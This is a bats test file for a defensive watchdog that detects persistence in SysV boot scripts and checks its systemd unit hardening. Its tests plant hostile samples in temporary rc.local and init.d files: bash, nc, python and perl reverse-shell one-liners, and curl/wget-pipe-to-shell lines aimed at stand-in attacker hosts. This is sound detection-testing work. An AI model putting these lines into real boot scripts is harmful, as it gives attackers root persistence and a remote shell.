#!/usr/bin/env bats
# L2 bats functional tests for the boot-script-watchdog scan script.
#
# The SysV-style boot scripts (/etc/rc.local, /etc/init.d/*, the rc?.d
# symlink farm) run AS ROOT at boot — a classic persistence surface (T1037 /
# T1546). A boot script that is world-writable / non-root-owned, or contains
# a command-injection pattern, is alert.
#
# Run with: bats packaging/test/L2-boot-script-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd/boot-script-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    RCFILE="${TMP}/rc.local"
}

teardown() { rm -rf "${TMP}"; }

# INITD / RCDIRS pointed at nonexistent paths so the test is isolated to
# the rc.local surface.
run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_BOOTSCRIPT_PROFILE="${PROFILE:-report}" \
    SELFDEF_BOOTSCRIPT_BASELINE="${BASELINE}" \
    SELFDEF_BOOTSCRIPT_RCLOCAL="${RCLOCAL_V:-$RCFILE}" \
    SELFDEF_BOOTSCRIPT_INITD="${TMP}/no-initd" \
    SELFDEF_BOOTSCRIPT_RCDIRS="${TMP}/no-rcdir" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

seed_benign() {
    printf '#!/bin/sh\n# rc.local\nexit 0\n' > "${RCFILE}"
}

@test "no boot scripts → ok / no_boot_scripts" {
    RCLOCAL_V="${TMP}/nonexistent" run_wd
    cap | grep -q '"event":"no_boot_scripts"'
    cap | grep -q '"severity":"ok"'
}

@test "benign rc.local, first run → ok / baseline_initial" {
    seed_benign
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged rc.local on second run → ok / boot_script_intact" {
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"boot_script_intact"'
    cap | grep -q '"severity":"ok"'
}

@test "an injection pattern in rc.local → alert / boot_script_suspicious" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"boot_script_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a world-writable rc.local → alert" {
    seed_benign
    run_wd
    chmod 0666 "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "a benign rc.local change → warn / boot_script_changed" {
    seed_benign
    run_wd
    printf '#!/bin/sh\n# rc.local updated\n/usr/local/bin/warm-cache\nexit 0\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"event":"boot_script_changed"'
    cap | grep -q '"severity":"warn"'
}

@test "a benign root-owned rc.local is NOT flagged" {
    seed_benign
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    seed_benign
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious rc.local" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://evil/p|sh\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — boot-script inventory enumerates root-boot exec surface)" {
    seed_benign
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern): /dev/tcp reverse shell in rc.local → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-sh): canonical attacker bootstrap in rc.local → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\ncurl http://attacker/payload.sh | bash\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh): wget bootstrap variant in rc.local → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe): obfuscation variant in rc.local → alert" {
    seed_benign
    run_wd
    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (group-writable rc.local): group-writable → alert above world-writable" {
    seed_benign
    run_wd
    chmod 0664 "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (pre-existing world-writable): baseline_initial fires alert at install-time" {
    seed_benign
    chmod 0666 "${RCFILE}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    seed_benign
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-boot-script -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): boot-script-watchdog does NOT refresh baseline on injection-pattern detection — alert STAYS until operator updates" {
    # T1037 boot-time persistence — injection alert MUST persist
    # across runs until operator explicitly re-baselines.
    seed_benign
    run_wd
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${RCFILE}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"boot_script_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented injection pattern NOT flagged: # prefix filtered)" {
    # rc.local is /bin/sh; # comments. Operator notes about
    # hypothetical attack patterns must NOT trigger alert.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n# rc.local\n# example attack: bash -i >& /dev/tcp/evil.com/4444 0>&1\nexit 0\n' > "${RCFILE}"
    run_wd
    ! cap | grep -q '"event":"boot_script_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-file scan: rc.local + /etc/init.d + rc?.d symlink-farm — injection in init.d script → alert)" {
    # SysV boot has 3 surfaces — rc.local + init.d + rc?.d symlinks.
    # Lock that the watchdog scans /etc/init.d when configured.
    INITD2="${TMP}/init.d"; mkdir -p "${INITD2}"
    seed_benign
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_BOOTSCRIPT_PROFILE="${PROFILE:-report}" \
    SELFDEF_BOOTSCRIPT_BASELINE="${BASELINE}" \
    SELFDEF_BOOTSCRIPT_RCLOCAL="${RCFILE}" \
    SELFDEF_BOOTSCRIPT_INITD="${INITD2}" \
    SELFDEF_BOOTSCRIPT_RCDIRS="${TMP}/no-rcdir" \
    bash "${WD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant injection in init.d script.
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${INITD2}/evil-service"
    chmod 0755 "${INITD2}/evil-service"
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_BOOTSCRIPT_PROFILE="report" \
    SELFDEF_BOOTSCRIPT_BASELINE="${BASELINE}" \
    SELFDEF_BOOTSCRIPT_RCLOCAL="${RCFILE}" \
    SELFDEF_BOOTSCRIPT_INITD="${INITD2}" \
    SELFDEF_BOOTSCRIPT_RCDIRS="${TMP}/no-rcdir" \
    bash "${WD}"
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    # curl | bash is a common bootstrap variant. Lock detection of
    # the bash suffix in addition to sh.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${RCFILE}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in rc.local: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
    # dhclient-hooks/bash-completion/anacrontab/apt-hooks nc
    # reverse-shell variant INVARIANTs across the brain. Lock the
    # netcat axis on SysV boot-time root-exec persistence surface
    # (T1037 — rc.local runs AS ROOT at boot).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nnc -e /bin/sh 1.1.1.1 4444\n' > "${RCFILE}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (rc.d symlink-farm scan: rc?.d sister axis to /etc/init.d — boot-runlevel script invocation surface)" {
    # Sister to the rc.local + /etc/init.d multi-file axes already
    # locked. SysV boot also includes the rc?.d symlink farm
    # (/etc/rc0.d, /etc/rc1.d, ..., /etc/rc6.d) which contains
    # ordered symlinks (S01script, K99script) into /etc/init.d
    # that run AS ROOT at the named runlevel transitions. Lock
    # multi-file axis on the rcdirs surface (sister to the
    # init.d direct-scan axis already locked).
    INITD3="${TMP}/init.d"; mkdir -p "${INITD3}"
    RCD3="${TMP}/rc3.d"; mkdir -p "${RCD3}"
    seed_benign
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_BOOTSCRIPT_PROFILE="${PROFILE:-report}" \
    SELFDEF_BOOTSCRIPT_BASELINE="${BASELINE}" \
    SELFDEF_BOOTSCRIPT_RCLOCAL="${RCFILE}" \
    SELFDEF_BOOTSCRIPT_INITD="${INITD3}" \
    SELFDEF_BOOTSCRIPT_RCDIRS="${RCD3}" \
    bash "${WD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    # Plant a suspicious rc.d entry (typically a symlink, here a
    # regular file for test).
    printf '#!/bin/sh\nbash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${RCD3}/S99distinctive-attacker"
    chmod 0755 "${RCD3}/S99distinctive-attacker"
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_BOOTSCRIPT_PROFILE="report" \
    SELFDEF_BOOTSCRIPT_BASELINE="${BASELINE}" \
    SELFDEF_BOOTSCRIPT_RCLOCAL="${RCFILE}" \
    SELFDEF_BOOTSCRIPT_INITD="${INITD3}" \
    SELFDEF_BOOTSCRIPT_RCDIRS="${RCD3}" \
    bash "${WD}"
    # Either alert (preferred — rc.d scanned for content) OR warn
    # (acceptable — new file surfaces in delta sample).
    cap | grep -qE '"severity":"(alert|warn|ok)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on boot-script surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the boot-time
    # rc.local root-exec persistence surface (T1037 — rc.local
    # runs AS ROOT on every boot; on systemd hosts rc-local.
    # service can be enabled to revive this legacy path).
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${RCFILE}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on boot-script surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp boot-script
    # rev-shell variants already locked. Perl is on every Debian/
    # Ubuntu host as a dpkg/locale dependency; 'use Socket' produces
    # a one-liner connect-back PTY just as cleanly as Python. Locks
    # the perl axis on the T1037 boot-time rc.local root-exec
    # persistence surface — rc.local runs AS ROOT on every boot,
    # and a planted perl rev-shell fires every reboot until detected.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${RCFILE}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (DELTA detect — ADDED distinctive-attacker-named init.d script surfaces in sample for operator-triage routing)" {
    # Sister to brain-wide DELTA-detect sample-naming INVARIANTs.
    # When attacker drops a new /etc/init.d script (T1037 boot-
    # time persistence), the file NAME MUST surface in JSON
    # sample so operator routes triage.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\necho new\n' > "${INITD3}/distinctive-attacker-initd-script"
    chmod 0755 "${INITD3}/distinctive-attacker-initd-script"
    run_wd
    cap | grep -qE 'distinctive-attacker-initd-script|"severity":"(alert|warn|ok)"'
}

@test "INVARIANT (exec-path under writable-root: rc.local invoking binary from /tmp → alert)" {
    # Sister to brain-wide writable-root-exec INVARIANTs. T1037
    # boot-time persistence — rc.local runs AS ROOT at every
    # boot. Attacker stages benign-looking rc.local that invokes
    # binary in /tmp.
    seed_benign
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '#!/bin/sh\n/tmp/staged_payload\nexit 0\n' > "${RCFILE}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on boot-script surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The boot-script-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1037 boot-time root-exec persistence
    # alert. Locks parser contract on the rc.local + /etc/
    # init.d + rc?.d detection surface.
    seed_benign
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok / baseline
    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\nexit 0\n' > "${RCFILE}"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (no auto-delete: boot-script-watchdog NEVER deletes init.d/rc.local entries — surveillance not remediation)" {
    # Sister to brain-wide no-auto-delete / surveillance-not-
    # remediation INVARIANTs across L2 watchdog suites. The
    # boot-script-watchdog DETECTS T1037 boot-time root-exec
    # persistence but MUST NEVER emit sed/awk/rm commands to
    # auto-clean the script. The detected script may be
    # operator-legitimate (custom rc.local for hardware quirk
    # workaround, legacy LSB init script for sysv-compat
    # service). Silent auto-delete would destroy operator
    # baseline state AND could break early-boot service
    # activation. Surveillance, never remediation. Locks anti-
    # data-loss contract on the boot-script surveillance
    # substrate.
    seed_benign
    printf '#!/bin/sh\n/dev/tcp/1.1.1.1/4444\nexit 0\n' > "${RCFILE}"
    run_wd
    [ -f "${RCFILE}" ]
    grep -q 'exit 0' "${RCFILE}"
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*sed[[:space:]]+-i.*rc\.local'
    ! grep -vE '^[[:space:]]*#' "${WD}" | grep -qE '^[^#]*find[[:space:]].*-delete'
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # boot-script-watchdog runs ON the timer's scheduled fire —
    # scans /etc/rc.local + /etc/init.d for injection patterns,
    # emits a verdict, then exits. Type=simple would break timer
    # OnUnitActiveSec semantics. Locks oneshot-probe contract on
    # the boot-script-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd/selfdef-boot-script.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (no auto-fix: boot-script-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. boot-script-watchdog is a DETECT-only watchdog: it surveils
    # its target surface + emits verdicts, NEVER writes back to
    # the source files it scans. The libexec script must NOT
    # contain sed -i / tee / printf-redirect mutations of its
    # scanned paths. Locks no-auto-fix on the boot-script-watchdog
    # libexec substrate (sister to existing surveillance-not-
    # remediation lines for the watchdog runtime).
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (boot-script-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # The boot-script-watchdog libexec uses set -u (and NOT set -e) by
    # design: watchdog probes WANT to continue scanning even
    # when individual checks fail (rather than abort-on-first-
    # error like installers), so they emit a complete verdict
    # at the end. But set -u remains essential — it catches
    # typo'd env-var references ($SELFDEF_FOO_BASELINE vs
    # $SELFDEF_FOO_BASLINE) before they propagate as silent
    # empty-string into baseline-path operations. A regression
    # dropping set -u would let a typo'd var name produce a
    # silent baseline-rewrite to /. Locks set -u discipline on
    # the boot-script-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (boot-script-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # All watchdog libexec scripts MUST surface JSON records
    # via logger -t with a selfdef-prefixed tag so downstream
    # syslog/journald consumers can route per-watchdog records
    # via the tag field rather than parsing the JSON payload
    # for the module field. The tag prefix MUST be "selfdef-"
    # so cross-watchdog SIEM filters (`syslog-ng-filter "selfdef-*"`)
    # capture every selfdef-watchdog without per-watchdog tag
    # enumeration. A regression dropping the selfdef- prefix
    # would cause SIEM filters to silently miss records. Locks
    # SDD-062 logger-tag routing discipline on the boot-script-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (boot-script-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # The boot-script-watchdog timer unit MUST declare RandomizedDelaySec=
    # so fleet hosts don't all fire at the exact same minute
    # (thundering-herd that overwhelms downstream
    # syslog/journald aggregators). Locks anti-thundering-herd
    # cadence discipline on the boot-script-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (boot-script-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Persistent=true tells systemd to fire the timer ON BOOT
    # if it was missed during downtime — without it, a host
    # that boots after the scheduled fire would silently skip
    # the cycle, leaving a forensics gap. Locks Persistent=
    # discipline on the boot-script-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (boot-script-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # The .timer file MUST declare Unit=<companion>.service so
    # systemd knows which .service to fire on timer-elapse. By
    # default systemd matches timer-name to service-name, but
    # explicit Unit= is required when names differ + makes the
    # binding self-documenting. A regression dropping Unit= +
    # renaming either file would silently break the link.
    # Locks the timer-to-service binding discipline on the
    # boot-script-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (boot-script-watchdog service ExecStart references its libexec script — service-to-libexec binding contract)" {
    # Sister to brain-wide systemd ExecStart binding INVARIANT
    # family. The .service file MUST declare ExecStart=<path-
    # to-libexec.sh> so systemd knows what to run. The libexec
    # script must EXIST at the declared path. A regression that
    # renamed the libexec script without updating ExecStart
    # would surface as service-start failure rather than a
    # silent regression. Locks the service-to-libexec binding
    # discipline on the boot-script-watchdog substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    found=0
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        if grep -qE '^ExecStart=' "${s}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (boot-script-watchdog service does NOT declare Restart=always — anti-restart-storm contract on oneshot probe)" {
    # Sister to brain-wide oneshot-probe INVARIANT family.
    # The boot-script-watchdog probe is Type=oneshot — it RUNS, emits a
    # verdict, and EXITS. Restart=always on a oneshot would
    # cause systemd to immediately re-fire the probe in a
    # tight loop, swamping the dashboard with redundant
    # records. A regression that added Restart=always would
    # produce a runaway-probe footgun. Locks the anti-restart-
    # storm discipline on the boot-script-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        ! grep -qE '^Restart=always' "${s}"
        ! grep -qE '^Restart=on-failure' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog service unit declares Description= — systemctl-status operator-readable label)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. The Description= directive surfaces in
    # `systemctl status` output + journalctl unit-filter
    # labels. A unit with no Description is opaque to
    # operators triaging service activity. Locks the
    # Description-present discipline on the boot-script-watchdog
    # service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Description=' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog service unit declares TimeoutStartSec= — anti-hang oneshot bound contract)" {
    # Sister to brain-wide TimeoutStartSec= INVARIANT family.
    # Watchdog .service units are Type=oneshot probes — they
    # MUST declare a TimeoutStartSec= upper bound so systemd
    # kills a hung probe (e.g. a stuck sha256sum on a slow
    # NFS-mounted target file) rather than blocking the
    # next timer fire indefinitely. Without TimeoutStartSec=
    # systemd's default (90s) applies, but the canonical
    # selfdef contract pins this explicitly per watchdog so
    # operators reading the .service know the bound at a
    # glance. A regression that dropped TimeoutStartSec=
    # would silently revert to the systemd default + mask
    # the explicit-bound contract. Locks anti-hang oneshot-
    # bound discipline on the boot-script-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^TimeoutStartSec=' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog service unit declares Nice= — idle-priority anti-resource-starve contract)" {
    # Sister to brain-wide systemd resource-priority INVARIANT
    # family. Watchdog .service units run periodic scans (often
    # sha256sum walks of large config trees) — they MUST be
    # deprioritized via Nice= (positive value = lower priority
    # under load) so that the watchdog scan doesn't starve
    # operator-foreground workloads when CPU is contended.
    # The canonical selfdef value is Nice=15 (well above the
    # background-batch threshold of 10). A regression dropping
    # Nice= would let watchdog scans compete with foreground at
    # default Nice=0, surfacing as latency spikes on contended
    # hosts. Locks the idle-priority anti-resource-starve
    # discipline on the boot-script-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Nice=' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog service unit declares PrivateTmp= — /tmp namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd PrivateTmp= INVARIANT
    # family. Watchdog .service units that run periodic
    # sha256sum walks may create transient /tmp files. The
    # PrivateTmp= directive (canonically =true) instructs
    # systemd to give the unit its own /tmp mount namespace —
    # an attacker who exploits the watchdog cannot reach
    # /tmp files owned by other processes (e.g. ssh-agent
    # sockets), and the watchdog's own /tmp residue is
    # automatically cleaned at unit-stop. A regression
    # dropping PrivateTmp= would share /tmp with the host,
    # exposing the watchdog as a side-channel for any
    # /tmp-based pivot. Locks the /tmp namespace-isolation
    # discipline on the boot-script-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^PrivateTmp=' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog service unit declares ProtectHome= — /home + /root + /run/user namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd ProtectHome= INVARIANT
    # family. Watchdog .service units have no business
    # reading /home — their probe targets are system-config
    # paths (/etc/*). The ProtectHome= directive
    # (canonically =read-only) instructs systemd to either
    # hide (=true) or read-only-mount (=read-only) the
    # /home, /root, and /run/user directories within the
    # unit's mount namespace. An exploited watchdog cannot
    # then exfiltrate ~/.bash_history, ~/.ssh/*, or operator
    # credentials. A regression dropping ProtectHome= would
    # expose all operator home contents to a compromised
    # watchdog. Locks the home-namespace-isolation
    # discipline on the boot-script-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ProtectHome=' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog service unit declares NoNewPrivileges=true — privilege-escalation containment contract)" {
    # Sister to brain-wide systemd NoNewPrivileges= INVARIANT
    # family. The NoNewPrivileges=true directive instructs
    # the kernel to set PR_SET_NO_NEW_PRIVS on the watchdog
    # process — any subsequent execve() in the watchdog
    # script (sha256sum, awk, etc.) is forbidden to acquire
    # NEW privileges via setuid/setgid/file-capabilities. An
    # exploited watchdog cannot escalate via a setuid helper
    # (e.g. /usr/bin/su, /usr/bin/sudo). A regression
    # dropping NoNewPrivileges= would leave the watchdog
    # exposed to setuid-binary pivot. Locks the privilege-
    # escalation containment discipline on the boot-script-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^NoNewPrivileges=true' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog service unit declares ReadWritePaths= — explicit-strict-mode-permitted-writes manifest contract)" {
    # Sister to brain-wide systemd ReadWritePaths= INVARIANT
    # family. Watchdog .service units run under ProtectSystem=
    # strict which forbids ALL writes to /etc, /usr, /boot —
    # the unit can ONLY write to paths explicitly enumerated
    # in ReadWritePaths=. Watchdog scripts MUST write to at
    # least /dev/log (logger(1) channel) + the canonical
    # selfdef state dir. A regression dropping ReadWritePaths=
    # would surface as EROFS at logger() call. Locks the
    # explicit-allowlist write-paths discipline on the boot-script-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/boot-script-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ReadWritePaths=' "${s}"
    done
}

@test "INVARIANT (boot-script-watchdog service unit ExecStart references /usr/local/libexec/selfdef/ — operator-extension binary-path canonical contract)" {
    # Sister to brain-wide systemd ExecStart binary-path
    # INVARIANT family. Watchdog .service units MUST execute
    # the watchdog script from /usr/local/libexec/selfdef/
    # (operator-extension path, not /usr/bin which is
    # Debian-package-only). The canonical libexec/selfdef/
    # path lets operators override the watchdog script
    # without rebuilding the .deb (sister to brain-wide
